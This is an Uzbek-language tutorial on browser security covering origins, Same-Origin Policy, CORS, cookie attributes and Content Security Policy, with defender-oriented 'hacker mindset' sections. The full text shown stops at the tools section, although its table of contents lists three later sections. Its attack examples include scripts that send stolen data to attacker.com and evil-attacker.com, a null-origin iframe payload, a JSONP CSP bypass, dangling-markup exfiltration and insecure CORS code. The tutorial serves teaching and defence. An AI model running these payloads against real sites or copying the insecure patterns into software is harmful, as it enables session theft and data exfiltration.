# Veb Ilovalar Xavfsizligi: SOP, CORS va CSP Bo'yicha Mukammal Qo'llanma
### *(Hacker Mindset, Real Hayotiy Misollar, Exploit Stsenariylari va Dasturchilar Uchun Professional Vositalar)*

> **Manbalar va Standartlar:**
> * [MDN Web Docs — Web Security Overview](https://developer.mozilla.org/en-US/docs/Web/Security)
> * [MDN Web Docs — Same-Origin Policy (SOP)](https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Same-origin_policy)
> * [MDN Web Docs — Cross-Origin Resource Sharing (CORS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS)
> * [MDN Web Docs — Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP)
> * [W3C Recommendation — CSP Level 3 & Fetch Standard](https://www.w3.org/TR/CSP3/)

---

## Mundarija
1. [Kirish: Brauzer Xavfsizlik Modeli Falsafasi](#1-kirish-brauzer-xavfsizlik-modeli-falsafasi)
2. [Origin (Manba) Konsepsiyasi: Qat'iy Chegara](#2-origin-manba-konsepsiyasi-qatiy-chegara)
3. [SOP (Same-Origin Policy — Bir Xil Manba Siyosati)](#3-sop-same-origin-policy--bir-xil-manba-siyosati)
   * 3.1. Texnik mohiyati va chegaralari
   * 3.2. Hayotiy misol: Ko'p qavatli bino va qo'shnilar
   * 3.3. Hacker Mindset: Agar SOP bo'lmaganida nima bo'lardi?
   * 3.4. SOP nimalarni to'xtatadi va nimalarni to'xtata olmaydi (CSRF paradoksi)
4. [CORS (Cross-Origin Resource Sharing)](#4-cors-cross-origin-resource-sharing)
   * 4.1. CORS nega paydo bo'ldi?
   * 4.2. Oddiy so'rovlar (Simple Requests) vs Murakkab (Preflight OPTIONS)
   * 4.3. Sarlavhalar lug'ati
   * 4.4. Hayotiy misol: Pasport nazorati va Elchixona vizasi
   * 4.5. Hacker Mindset: CORS Zaifliklari va Haqiqiy Hujum Stsenariylari (Exploitation)
5. [Cookie, HttpOnly va SameSite: Sessiya Xavfsizligi Anatomiyasi](#5-cookie-httponly-va-samesite-sessiya-xavfsizligi-anatomiyasi)
   * 5.1. Cookie va Portlar orasidagi ziddiyat
   * 5.2. `HttpOnly` nima va hackerlar unga duch kelganda nima qiladi?
   * 5.3. `SameSite` atributi (Strict, Lax, None)
6. [CSP (Content Security Policy — Tarkib Xavfsizligi Siyosati)](#6-csp-content-security-policy--tarkib-xavfsizligi-siyosati)
   * 6.1. CSP falsafasi: XSS ga qarshi chuqurlashtirilgan mudofaa
   * 6.2. Direktivalar ierarxiyasi
   * 6.3. Zamonaviy CSP: Nonce va Hash mexanizmi
   * 6.4. Hayotiy misol: Maxsus rejimdagi bino tekshiruvi
   * 6.5. Hacker Mindset: CSP Bypass (Aylanib o'tish) Usullari
7. [Dasturchilar va Xavfsizlik Mutaxassislari Uchun Professional Toollar](#7-dasturchilar-va-xavfsizlik-mutaxassislari-uchun-professional-toollar)
   * 7.1. Burp Suite, OWASP ZAP, Corsy va CSP Evaluator
   * 7.2. "dirb" hackerlar asbobi: CSP ni chetlab o'ta oladimi yoki test rejimida qanday qo'llaniladi?
8. [A1 Laboratoriyasi Tajribalarining Xavfsizlik Nuqtai Nazaridan Tahlili](#8-a1-laboratoriyasi-tajribalarining-xavfsizlik-nuqtai-nazaridan-tahlili)
9. [DevSecOps: Ishlab Chiquvchilar Uchun Oltin Qoidalar](#9-devsecops-ishlab-chiquvchilar-uchun-oltin-qoidalar)
10. [FastAPI Dasturchilari Uchun: CSP ni Loyihada Ishlatish Qo'llanmasi](#10-fastapi-dasturchilari-uchun-csp-ni-loyihada-ishlatish-qollanmasi)
    * 10.1. FastAPI Middleware orqali Statik CSP qo'shish
    * 10.2. Dinamik Nonce generatsiyasi va Jinja2 shablonlariga ulash
    * 10.3. Python `secure` kutubxonasi yordamida to'liq xavfsizlik sarlavhalari

---

## 1. Kirish: Brauzer Xavfsizlik Modeli Falsafasi

Zamonaviy veb-brauzer — bu dunyodagi eng murakkab va eng ko'p hujumga uchraydigan operatsion tizimchadir. Siz har kuni Internetda kezganingizda, brauzeringiz siz tanimagan, ishonmagan va hatto dushmanona bo'lishi mumkin bo'lgan serverlardan JavaScript kodlarini yuklab oladi va ularni **to'g'ridan-to'g'ri sizning kompyuteringiz xotirasida ishga tushiradi**.

Tasavvur qiling: siz kompyuteringizga ko'chadagi notanish odam bergan `.exe` faylni yuklab olib, o'ylab o'tirmay ishga tushirasizmi? Albatta yo'q! Lekin har safar biror veb-saytga kirganingizda brauzer aynan shuni qiladi — u begona skriptlarni yuklab olib darhol yurgizadi.

Xo'sh, nega unda har kuni hisoblarimiz o'g'irlanmaydi yoki kompyuterimiz buzilib ketmaydi?
Chunki brauzer o'z ichida qat'iy **Xavfsizlik Sandboxi (Qumloq muhiti)** va xavfsizlik chegaralariga ega. Ushbu sandboxning eng asosiy ustunlari:
1. **SOP (Same-Origin Policy)** — Izolyatsiya va chegaralash poydevori.
2. **CORS (Cross-Origin Resource Sharing)** — Nazorat qilinadigan nazorat-o'tkazish punkti.
3. **CSP (Content Security Policy)** — Ichki tartib-intizom va ijro etish qoidalari.

---

## 2. Origin (Manba) Konsepsiyasi: Qat'iy Chegara

Brauzer uchun dunyodagi har bir resurs o'zining **Origin (Kelib chiqish manbasi)** ga ega. Brauzer ikkita sahifa bir-birining ma'lumotlariga teginishi mumkin yoki yo'qligini aniqlashda faqat bitta matematik formuladan foydalanadi:

$$\mathbf{Origin = \text{Sxema (Protokol)} + \text{Host (Domen yoki IP)} + \text{Port}}$$

Agar ushbu 3 ta komponentdan **bittasi bo'lsa ham farq qilsa**, brauzer bu ikki resursni butunlay begona (Cross-Origin) deb e'lon qiladi!

```
http://127.0.0.1:8000/api/info?user=admin#section
^^^^   ^^^^^^^^^ ^^^^
 ||        ||     ||
Sxema     Host   Port   -----> ORIGIN: http://127.0.0.1:8000
                        -----> PATH, QUERY, FRAGMENT originga kirmaydi!
```

### Origin Taqqoslash Matritsasi (Amaliy Misollar):
Quyidagi jadvalda `http://127.0.0.1:8000` ga nisbatan turli manzillarning holati ko'rsatilgan:

| Taqqoslanadigan URL | Bir xil Originmi? | Sabab va Texnik Izoh |
| :--- | :---: | :--- |
| `http://127.0.0.1:8000/profile` | **HA** | Sxema (`http`), Host (`127.0.0.1`) va Port (`8000`) bir xil. URL yo'li (`/profile`) originni o'zgartirmaydi. |
| `http://127.0.0.1:8000/api/v1/users` | **HA** | Barcha 3 parametr ayni o'zi. |
| `http://127.0.0.1:8001/` | **YO'Q** | Port farqli (`8000` != `8001`). Xizmatlar bitta IPda bo'lsa ham, ular boshqa origin! |
| `http://localhost:8000/` | **YO'Q** | Host nomi farqli (`127.0.0.1` != `localhost`). Brauzer DNS orqali ularning IPsi bir ekanini tekshirmaydi; satriy (string) moslik shart. |
| `https://127.0.0.1:8000/` | **YO'Q** | Sxema (protokol) farqli (`http` != `https`). |
| `http://127.0.0.1/` | **YO'Q** | Ochiq ko'rsatilmagan standart HTTP porti `80` hisoblanadi (`8000` != `80`). |

> **Xavfsizlik nuqtai nazaridan "null" Origin nima?**  
> Agar sahifa `file:///path/index.html` orqali mahalliy diskdan ochilsa, `data:text/html,...` orqali yuklansa yoki `sandbox` atributli `<iframe>` ichida ishlasa, uning origini maxsus `null` qiymatiga ega bo'ladi. `null` origin o'ta cheklangan bo'lib, u hatto boshqa `null` origin bilan ham mos kelmaydi!

---

## 3. SOP (Same-Origin Policy — Bir Xil Manba Siyosati)

### 3.1. Texnik Mohiyati va Chegaralari
**SOP** — bu brauzer xavfsizligining eng qadimgi (1995-yilda Netscape 2.0 da joriy qilingan) va eng muhim qonunidir.

* **Qoida:** Bir origindan yuklangan skript faqat o'sha originga tegishli resurslarning (DOM, Cookie, LocalStorage, Fetch/XHR javoblari) mazmunini **o'qish** huquqiga ega.

#### SOP nimaga ruxsat beradi va nimani taqiqlaydi?
Veb ishlashi uchun SOP barcha narsani bloklayvermaydi:
1. **Cross-Origin Writing (Yozish) — RUXSAT ETILGAN:**  
   Boshqa originga havola orqali o'tish (`<a href="...">`), formani boshqa manbaga jo'natish (`<form action="http://other.com/login" method="POST">`) yoki yo'naltirish (Redirect).
2. **Cross-Origin Embedding (Ichiga joylash) — RUXSAT ETILGAN:**  
   Boshqa saytdan rasm yuklash (`<img src="...">`), CSS ulash (`<link rel="stylesheet">`), skript chaqirish (`<script src="...">`), video/audio qo'yish (`<video>`).
3. **Cross-Origin Reading (O'qish) — QAT'IYAN TAQIQLANGAN:**  
   JavaScript orqali boshqa origindan kelgan HTTP javobining tana qismini (Body/JSON) o'qish, boshqa origindagi `iframe` ichidagi DOM elementlarini ko'rish yoki `document.cookie` ni o'g'irlash.

---

### 3.2. Hayotiy Misol: Ko'p Qavatli Bino va Qo'shnilar

Tasavvur qiling, siz katta ko'p qavatli turar-joy binosida yashaysiz:
* Har bir xonadon — bu bitta **Origin** (masalan, 1-podyezd, 4-qavat, 42-xonadon).
* Siz — 42-xonadonda yashovchi odamsiz (Veb sahifa skripti).
* Siz qo'shningizning (84-xonadon) eshigi ostiga xat tashlab ketishingiz mumkin (*Cross-Origin Write / Form submit*).
* Siz qo'shningiz balkonga ilib qo'ygan plakatni yoki derazasidagi gulni ko'chadan turib tomosha qilishingiz mumkin (*Cross-Origin Embedding / Images*).
* **LEKIN siz qo'shningizning xonadoniga kalitsiz kirib, uning seyfidagi shartnomalar, pasport va pullarini O'QIB, OLIB CHIQIB KETA OLMAYSIZ!** (*SOP Read taqiqi*).

Agar har kim qo'shnisining xonasiga kirib narsalarini titishiga ruxsat berilsa — bu binoda yashab bo'lmasdi. SOP aynan shu devor va qulflangan eshikdir.

---

### 3.3. Hacker Mindset: Agar SOP Bo'lmaganida Dunyo Qanday Bo'lardi?

Hackerlar ko'zi bilan qaraylik: SOP bo'lmasa, nima yuz berardi?

Tasavvur qiling:
1. Siz o'zingizning onlayn bankingizga (`https://mybank.uz`) kirdingiz va profilingiz ochiq turibdi (sessiya cookie mavjud).
2. Siz ikkinchi tabda qiziqarli yangilik yoki kino ko'rish uchun `http://evil-attacker.com` saytiga kirdingiz.
3. Agar SOP **BO'LMAGANIDA**, bu buzg'unchi saytdagi oddiygina 3 qator JavaScript kodi quyidagini amalga oshirgan bo'lardi:

```javascript
// AGAR SOP BO'LMAGANDA HACKER YOZADIGAN KOD:
fetch('https://mybank.uz/api/account/balance')
  .then(res => res.json())
  .then(data => {
      // Sizning barcha bank hisoblaringiz, pulingiz va parollaringiz
      // to'g'ridan-to'g'ri buzg'unchining serveriga yuboriladi!
      navigator.sendBeacon('https://evil-attacker.com/steal', JSON.stringify(data));
  });
```

Chunki brauzer bankka so'rov jo'natayotganda avtomatik tarzda sizning bankingizga tegishli cookie fayllarini biriktirib jo'natardi. Agar SOP bo'lmaganda, `evil-attacker.com` ushbu shaxsiy ma'lumotlarni bemalol o'qib olgan bo'lardi. 

**Xulosa:** SOP sizni har kuni yuzlab saytlardan shaxsiy ma'lumotlaringiz sizib chiqishidan saqlab turuvchi eng asosiy qalqondir!

---

### 3.4. SOP Nimalarni To'xtatadi va Nimalarni TO'XTATA OLMAYDI (CSRF Paradoksi)

Ko'pchilik dasturchilar yo'l qo'yadigan eng katta xato:  
*"Menda SOP bor, demak boshqa sayt mening serverimga so'rov yubora olmaydi!"* — **BU MUTLAQO XATO!**

> [!WARNING] **SOPning Katta Kamchiligi: CSRF (Cross-Site Request Forgery)**  
> SOP **javobni o'qishni** to'xtatadi, lekin **so'rov yuborishni to'xtatmaydi!**

```
[Buzg'unchi Sayti: evil.com]
          |
          |  1. <form action="https://bank.uz/transfer" method="POST">
          |     (So'rov serverga yetib boradi va pul o'tkaziladi!)
          v
[Bank Serveri: bank.uz]
          |
          |  2. HTTP 200 OK (Muvaffaqiyatli o'tkazildi)
          v
[Brauzer: evil.com tab]
          |
          X  SOP faqat 200 javob matnini evil.com skriptiga O'QITMAYDI!
             Lekin ish allaqachon bitgan — pul o'tkazib bo'lingan!
```

Bu holat **CSRF zaifligi** deb ataladi. Shuning uchun ham SOP CSRF ga qarshi himoya vositasi emas. CSRF ga qarshi `CSRF Token`, `SameSite Cookie` yoki maxsus tekshiruvlar talab qilinadi.

---

## 4. CORS (Cross-Origin Resource Sharing)

### 4.1. CORS Nega Paydo Bo'ldi?

Veb rivojlanib bordi. Kompaniyalar bitta monolit server o'rniga zamonaviy arxitekturaga o'ta boshladilar:
* Frontend SPA ilovasi: `https://frontend.company.com`
* Backend REST API: `https://api.company.com`
* Rasmlar va media: `https://cdn.company.com`

Bu domenlar har xil origin! Endi `frontend.company.com` dagi JavaScript kodi `api.company.com` ga `fetch()` qilganda, **SOP darhol uni bloklay boshladi**.

Dasturchilarga qonuniy va xavfsiz tarzda boshqa origindan ma'lumot olish mexanizmi kerak bo'ldi. Natijada **CORS (Cross-Origin Resource Sharing)** standarti yaratildi.

> **CORS nima?**  
> CORS — bu SOPni bekor qilish emas! CORS — bu serverga qaysi begona originlarga uning javobini o'qishga ruxsat berilishini brauzerga e'lon qilish imkonini beruvchi HTTP sarlavhalari tizimidir.

---

### 4.2. Oddiy So'rovlar (Simple Requests) vs Murakkab (Preflight OPTIONS)

Brauzer barcha cross-origin so'rovlarni bir xil bajarmaydi. U ularni ikki toifaga ajratadi:

```
Cross-Origin So'rov
       |
       +---> Oddiy So'rov (Simple Request)
       |     (GET, POST, HEAD + oddiy sarlavhalar)
       |     --> Darhol jo'natiladi --> Javobda CORS tekshiriladi.
       |
       +---> Murakkab So'rov (Preflighted Request)
             (PUT, DELETE, PATCH, Authorization sarlavhasi, application/json)
             --> Avval OPTIONS preflight jo'natiladi --> Ruxsat olinsa, asosiy so'rov ketadi.
```

#### 1. Oddiy so'rov (Simple Request):
* Metodlar: faqat `GET`, `HEAD`, `POST`.
* Ruxsat etilgan sarlavhalar: `Accept`, `Accept-Language`, `Content-Language`, `Content-Type`.
* `Content-Type` faqat quyidagilardan biri bo'lishi shart:
  * `application/x-www-form-urlencoded`
  * `multipart/form-data`
  * `text/plain`
* **Jarayon:** Brauzer so'rovni darhol serverga jo'natadi. Server javob qaytargach, brauzer `Access-Control-Allow-Origin` bor-yo'qligini tekshiradi.

#### 2. Murakkab so'rov (Preflight Request):
Agar siz `PUT`, `DELETE` metodini ishlatsangiz, `Content-Type: application/json` yuborsangiz yoki `Authorization: Bearer <token>` sarlavhasini qo'shsangiz:
* Brauzer asosiy so'rovni yuborishdan oldin serverga maxsus **`OPTIONS`** so'rovini yuboradi ("Preflight — oldindan uchish").
* OPTIONS so'rovining maqsadi: *"Ey server, men `application/json` bilan `PUT` so'rovi yubormoqchiman, bunga ruxsat berasanmi?"* deb so'rash.
* Faqat server `Access-Control-Allow-Methods` va `Access-Control-Allow-Headers` bilan ruxsat bersagina, haqiqiy `PUT` so'rovi yuboriladi.

---

### 4.3. Sarlavhalar Lug'ati

Mijoz va Server o'rtasidagi CORS muloqoti quyidagi HTTP sarlavhalari orqali kechadi:

| Sarlavha | Kim yuboradi? | Vazifasi va Misol |
| :--- | :---: | :--- |
| `Origin` | Brauzer | So'rov aynan qaysi manbadan kelayotganini ko'rsatadi (`Origin: http://127.0.0.1:8000`). JavaScript bu sarlavhani soxtalashtira olmaydi! |
| `Access-Control-Allow-Origin` | Server | Qaysi originga ruxsat berilganini bildiradi (`Access-Control-Allow-Origin: http://127.0.0.1:8000` yoki `*`). |
| `Access-Control-Allow-Credentials` | Server | Cookielar yoki autentifikatsiya tokenlari cross-origin so'rovda ishlatilishiga ruxsat beradi (`true`). |
| `Access-Control-Allow-Methods` | Server | Qaysi HTTP metodlariga ruxsat berilganini bildiradi (`GET, POST, PUT, DELETE`). |
| `Access-Control-Allow-Headers` | Server | Qaysi maxsus sarlavhalarga ruxsat berilganini bildiradi (`Content-Type, Authorization`). |
| `Access-Control-Max-Age` | Server | Preflight OPTIONS javobini brauzer qancha soniya keshlab turishi mumkinligini aytadi (masalan, `86400`). |

---

### 4.4. Hayotiy Misol: Pasport Nazorati va Elchixona Vizasi

* Siz — chet elga chiqmoqchi bo'lgan sayyohsiz (`http://127.0.0.1:8000`).
* Chet davlat chegarasi — bu API Server (`http://127.0.0.1:8001`).
* Sizning aeroportingiz xavfsizlik xizmati — bu **Brauzer**.

1. Siz chegaradan o'tmoqchi bo'lganingizda, aeroport sizning qo'lingizga davlatingiz pasportini tutqazadi (`Origin: http://127.0.0.1:8000`).
2. Chegarachiga yetib borganingizda, u qaraydi: bu davlat fuqarolari uchun kirishga ruxsat bormi?
3. Agar chegarachi o'z ro'yxatida sizning davlatingizni topsa (`Access-Control-Allow-Origin: http://127.0.0.1:8000`), u sizni quchoq ochib kutib oladi va yuklaringizni (JSON) olib kirishga ruxsat beradi.
4. Agar ro'yxatda sizning davlatingiz bo'lmasa, aeroport xavfsizlik xizmati (Brauzer) darhol sizni to'xtatadi va sizga yuklarni olishga yo'l qo'ymaydi (*CORS Blocked*).

---

### 4.5. Hacker Mindset: CORS Zaifliklari va Haqiqiy Hujum Stsenariylari (Exploitation)

Hackerlar CORS konfiguratsiyasidagi eng kichik xatolardan ham qanday foydalanadi?

#### 1-Zaiflik: Noto'g'ri Dasturlash (Dynamic Origin Reflection + Credentials)
Ko'pgina dasturchilar CORS xatolaridan charchab, internetdan yoki StackOverflow'dan quyidagi xavfli yechimni ko'chirib olishadi:
*"Kelgan har qanday Originni o'qib, o'shani Allow-Origin qilib qaytarib yubor!"*

```python
# JUDA XAVFLI BACKEND KODI:
origin = request.headers.get('Origin')
response.headers['Access-Control-Allow-Origin'] = origin
response.headers['Access-Control-Allow-Credentials'] = 'true'
```

**Buzg'unchi buni qanday exploit qiladi?**
Hacker `https://attacker.com` saytiga skript qo'yadi:
```html
<script>
fetch('https://vulnerable-bank.com/api/private-data', {
    credentials: 'include' // Foydalanuvchi cookielarini qo'shib yuboradi!
})
.then(r => r.json())
.then(data => {
    // Bank serveri: "Origin: attacker.com ekansan, marhamat!" deb ruxsat beradi.
    // Natijada barcha maxfiy ma'lumotlar o'g'irlanadi!
    fetch('https://attacker.com/log?stolen=' + JSON.stringify(data));
});
</script>
```

#### 2-Zaiflik: `Origin: null` ga Ishonish
Ba'zan dasturchilar mahalliy fayllar yoki iframelar ishlashi uchun `null` originga ruxsat berishadi:
```http
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```
**Exploit:** Buzg'unchi o'z saytiga qumli (sandboxed) iframe joylashtiradi:
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" 
        src="data:text/html,<script>
        fetch('https://target.com/api/user', {credentials: 'include'})
        .then(r => r.text())
        .then(d => parent.postMessage(d, '*'));
        </script>">
</iframe>
```
Sandboxed iframe brauzer tomonidan `Origin: null` deb yuboriladi va server unga ma'lumotlarni berib yuboradi!

#### 3-Zaiflik: Regex (Muntazam Ifodalar) dagi Xatolik
Dasturchi faqat o'z domeniga ruxsat bermoqchi bo'lib shunday yozadi:
```python
# Noto'g'ri regex:
if re.search("company.com", origin):
    allow_origin(origin)
```
**Buzg'unchi qanday domen oladi?**
* `attacker-company.com` (chunki ichida `company.com` bor!)
* `company.com.attacker.com`
Ikkala holatda ham regex mos keladi va CORS to'liq aylanib o'tiladi.

---

## 5. Cookie, HttpOnly va SameSite: Sessiya Xavfsizligi Anatomiyasi

### 5.1. Cookie va Portlar Orasidagi Katta Ziddiyat
Bu laboratoriya ishidagi eng nozik texnik nuqta:
* **Origin** — portlarni ajratadi (`127.0.0.1:8000` != `127.0.0.1:8001`).
* **Cookie** — portlarni **AJRATMАYDI**!

Cookie faqat **Host/Domain** ga qaraydi. Agar `http://127.0.0.1:8000` da cookie o'rnatilsa, brauzer ushbu cookieni `http://127.0.0.1:8001` ga ham, `http://127.0.0.1:9000` ga ham bir xil domen deb hisoblab yuborishi mumkin.

---

### 5.2. `HttpOnly` Nima va Hackerlar Unga Duch Kelganda Nima Qiladi?

Server cookieni o'rnatayotganda quyidagi sarlavhani yuboradi:
```http
Set-Cookie: session_id=SECRET_TOKEN; Path=/; HttpOnly; Secure; SameSite=Lax
```

* **`HttpOnly` vazifasi:** JavaScriptdagi `document.cookie` obyektidan ushbu cookieni butunlay yashiradi.
* **Nega bu muhim?** Agar saytda XSS zaifligi paydo bo'lsa, tajovuzkor `alert(document.cookie)` qilib sessiyani o'g'irlay olmaydi.

#### Hacker Mindset: Agar Cookie HttpOnly bo'lsa, tajovuzkor to'xtab qoladimi?
**YO'Q!** Professional hackerlar shunday fikrlaydi:
> *"Men cookieni o'qiy olmasam ham, uning nomidan amallarni bajara olaman!"*

1. **XHR/Fetch Session Riding:**  
   Buzg'unchi sayt ichiga tushgan XSS orqali to'g'ridan-to'g'ri qurbon nomidan so'rov yuboradi. Masalan:
   ```javascript
   fetch('/api/user/change-password', {
       method: 'POST',
       body: JSON.stringify({new_pass: 'Hacked123!'})
   });
   ```
   Brauzer `HttpOnly` cookieni so'rovga o'zi yashirincha qo'shib jo'natadi!
2. **Credential Harvester UI:**  
   Buzg'unchi sahifadagi DOM elementlarini o'zgartirib, soxta login oynasini (Phishing form) chiqaradi va foydalanuvchining login/parolini qo'lda kiritishga majbur qiladi.

---

### 5.3. `SameSite` Atributi (Strict, Lax, None)

CSRF ga qarshi brauzer darajasidagi asosiy mudofaa:
* **`SameSite=Strict`:** Cookie FAQAT bir xil sayt ichidagi harakatlarda yuboriladi. Agar foydalanuvchi tashqi saytdan (masalan Telegramdagi havoladan) saytga bossa ham, cookie yuborilmaydi (foydalanuvchi tizimga kirmagandek ko'rinadi).
* **`SameSite=Lax` (Standart/Default):** Xavfsiz navigatsiyalarda (tashqi havoladan `GET` orqali o'tganda) cookie yuboriladi, lekin boshqa saytdan kelgan `POST` so'rovlarida yuborilmaydi.
* **`SameSite=None; Secure`:** Cross-site so'rovlarda ham cookie yuborilishiga ruxsat beradi (faqat HTTPS sharti bilan).

---

## 6. CSP (Content Security Policy — Tarkib Xavfsizligi Siyosati)

### 6.1. CSP Falsafasi: XSS ga Qarshi Chuqurlashtirilgan Mudofaa

XSS (Cross-Site Scripting) — yillar davomida eng xavfli veb-zaifliklar qatorida turadi. Agar dasturchi foydalanuvchi kiritgan ma'lumotni to'g'ri filtrlamasa, sayt ichiga begona JavaScript kodi tushib qoladi.

**CSP (Content Security Policy)** — bu dasturchining brauzerga beradigan qat'iy buyrug'idir:
> *"Men faqat falon-falon joylardan kelgan kodlarga ishonaman. Qolgan har qanday kodni, hatto u HTML ichida turgan bo'lsa ham, IJRO ETMA!"*

CSP server javobining HTTP sarlavhasida beriladi:
```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trustedscripts.com;
```

---

### 6.2. Direktivalar Ierarxiyasi

CSP ko'plab resurs turlarini alohida nazorat qiladi:

```
                      default-src (Boshlang'ich qoida)
                                 |
         +-----------------------+-----------------------+
         |                       |                       |
     script-src              style-src               connect-src
  (JS fayllar/kodlar)    (CSS uslublar)          (fetch, XHR, WebSocket)
         |                       |                       |
      img-src                 font-src                object-src
   (Rasmlar)             (Shriftlar)              (Flash, Java plaginlar)
```

* `default-src 'self'`: Agar biror resurs turi uchun alohida qoida yozilmagan bo'lsa, ushbu umumiy qoida qo'llaniladi (`'self'` — faqat shu origin).
* `script-src 'self'`: Skriptlar faqat saytning o'zidan yuklanishi kerak.
* `connect-src 'self' http://127.0.0.1:8001`: `fetch()` yoki `XMLHttpRequest` faqat shu ko'rsatilgan manzillarga borishi mumkin.
* `object-src 'none'`: Eskirgan va xavfli `<object>`, `<embed>` teglari butunlay taqiqlanadi.
* `base-uri 'none'` yoki `'self'`: `<base href="...">` tegi orqali resurs yo'llarini o'g'irlashni to'xtatadi.
* `frame-ancestors 'none'`: Clickjacking hujumiga qarshi saytni boshqa saytlar ichida `<iframe>` qilishni taqiqlaydi.

---

### 6.3. Zamonaviy CSP: Nonce va Hash Mexanizmi

Eski CSP tizimida hamma narsa oq ro'yxat (Whitelist) domenlari orqali boshqarilardi (masalan `script-src https://cdn.com`). Biroq bu usul eskirib, zaif ekani ma'lum bo'ldi.

Bugungi zamonaviy CSP **Nonce (Bir martalik tasodifiy raqam)** ga asoslanadi:

1. Server har bir HTTP so'rov uchun noyob, taxmin qilib bo'lmaydigan tasodifiy kalit generatsiya qiladi (masalan, `nonce-EDNnf03nceI1nn3jds1GgsA==`).
2. Server bu kalitni CSP sarlavhasiga yozadi:
   ```http
   Content-Security-Policy: script-src 'nonce-EDNnf03nceI1nn3jds1GgsA=='
   ```
3. Sahifadagi qonuniy skript tegiga aynan shu atribut beriladi:
   ```html
   <script nonce="EDNnf03nceI1nn3jds1GgsA==">
       console.log("Bu skript ishlaydi!");
   </script>
   ```
4. Agar tajovuzkor izohlar yoki forma orqali `<script>alert(1)</script>` kiritishga muvaffaq bo'lsa ham, unda joriy so'rovning `nonce` kaliti bo'lmagani sababli brauzer bu kodni **ISHLATMAYDI**!

---

### 6.4. Hayotiy Misol: Maxsus Rejimdagi Bino Tekshiruvi

* Davlat xavfsizlik binosi — bu **Veb-sayt**.
* Ichkariga kirayotgan har bir xodim — bu **JavaScript kodi**.
* **CSP** — bino nazorat-o'tkazish punktining yo'riqnomasi.

1. Boshliq buyruq bergan: *"Faqat bino xodimlarining o'zi (`'self'`) va ko'kragida bugungi bir martalik maxsus shtampi (`nonce`) bor odamlar kiritilsin!"*
2. Binoning o'z doimiy xodimi (`/app.js`) keladi — uning shaxsiy guvohnomasi bor, ichkariga kiradi.
3. Ko'chadan notanish odam (Inline `<script>` — XSS) bino devoridan sakrab ichkariga tushib oladi.
4. Ichkaridagi qorovul (Brauzer) darhol uning ko'kragiga qaraydi: unda bir martalik maxsus shtamp (`nonce`) yo'q!
5. Natija: Qorovul uni darhol hibsga oladi va xonadan chiqarib tashlaydi (*CSP Blocked*).

---

### 6.5. Hacker Mindset: CSP Bypass (Aylanib O'tish) Usullari

Tajovuzkorlar zaif sozlangan CSP ni qanday chetlab o'tishadi?

#### 1. `'unsafe-inline'` Balosi
Agar dasturchi o'ziga oson bo'lishi uchun quyidagicha yozsa:
```http
Content-Security-Policy: script-src 'self' 'unsafe-inline'
```
Bu CSP ning barcha himoyasini deyarli nolga tenglashtiradi! Chunki `'unsafe-inline'` ruxsati berilgan zahoti, hacker kiritgan har qanday `<script>` yoki `<img src=x onerror=...>` ishga tushib ketadi.

#### 2. Ochiq JSONP Endpointlar Orqali Skript Yuklash
Agar CSP oq ro'yxatida yirik CDN yoki Google domenlari bo'lsa:
```http
Content-Security-Policy: script-src 'self' https://cdnjs.cloudflare.com https://accounts.google.com
```
Buzg'unchi saytga o'zining zararli JS faylini yuklamaydi. U Google yoki CDN dagi mavjud JSONP endpointini topib, shunday chaqiradi:
```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(document.domain)"></script>
```
Natijada xavfsiz domen orqali ixtiyoriy kod ijro etiladi!

#### 3. Dangling Markup Injection (CSP JS ni to'xtatganda ma'lumot o'g'irlash)
Agar CSP barcha skriptlarni mukammal bloklayotgan bo'lsa, tajovuzkor JavaScriptsiz ma'lumot o'g'irlashi mumkin!
Hacker yopilmagan rasm tegi kiritadi:
```html
<img src='https://attacker.com/steal?data=
```
Brauzer sahifaning keyingi qismidagi barcha matnlarni (shu jumladan yashirin CSRF tokenlar va parollarni) bitta katta URL deb o'ylab, rasm sifatida yuklash uchun `attacker.com` ga jo'natib yuboradi!

---

## 7. Dasturchilar va Xavfsizlik Mutaxassislari Uchun Professional Toollar

Veb-xavfsizlikni tahlil qilish, testlash va himoyalashda quyidagi professional vositalar sanoat standarti hisoblanadi:

```
                    Professional Xavfsizlik Asboblari
                                   |
         +-------------------------+-------------------------+
         |                         |                         |
   Proksi & Analiz          CORS Skripterlari         CSP Baholovchilari
   - Burp Suite             - Corsy                   - CSP Evaluator
   - OWASP ZAP              - CORStest                - Laboratory
   - Postman / cURL         - Browser Extensions      - DevTools Security
```

### 1. Burp Suite (Community / Professional)
* **Vazifasi:** Veb-ilovalar xavfsizligini tekshirish uchun dunyodagi 1-raqamli vosita. Brauzer va server o'rtasidagi barcha HTTP/HTTPS so'rovlarni tutib oladi (Interception).
* **CORS va CSP da qo'llanilishi:**
  * *Repeater:* So'rovdagi `Origin` sarlavhasini o'zgartirib ko'rib, server qanday javob qaytarishini sinash.
  * *Match & Replace:* Javoblardan CSP sarlavhasini avtomatik olib tashlab yoki o'zgartirib, ilova qanday reaksiyaga kirishishini o'rganish.

### 2. OWASP ZAP (Zed Attack Proxy)
* **Vazifasi:** Butunlay bepul va ochiq kodli xavfsizlik skaneri.
* **Qo'llanilishi:** Avtomatlashtirilgan tarzda butun veb-saytni tekshirib, yetishmayotgan xavfsizlik sarlavhalari (`Missing CSP`, `Weak CORS`, `Cookie without HttpOnly`) haqida to'liq hisobot tuzadi.

### 3. Corsy va CORStest (Python Vositalari)
* **Vazifasi:** CORS xatolarini avtomatik qidirish skriptlari.
* **O'rnatish va ishlatish:**
  ```bash
  # Corsy ni yuklab olish
  git clone https://github.com/s0md3v/Corsy.git
  cd Corsy
  python3 corsy.py -u https://example.com --headers "User-Agent: GoogleBot"
  ```
* Bu vosita avtomatik ravishda `Origin: null`, `Origin: attacker.com`, regex aylanib o'tishlar va `credentials: true` kombinatsiyalarini tekshirib, zaifliklarni fosh qiladi.

### 4. Google CSP Evaluator (csp-evaluator.withgoogle.com)
* **Vazifasi:** Google tomonidan yaratilgan rasmiy vosita.
* **Qo'llanilishi:** Dasturchi o'zining CSP satrini kiritadi. Dastur esa undagi xavfli nuqtalarni (masalan: `'unsafe-inline'` borligi, `base-uri` yetishmasligi, oq ro'yxatdagi xavfli CDNlar) sariq va qizil ogohlantirishlar bilan tushuntirib beradi.

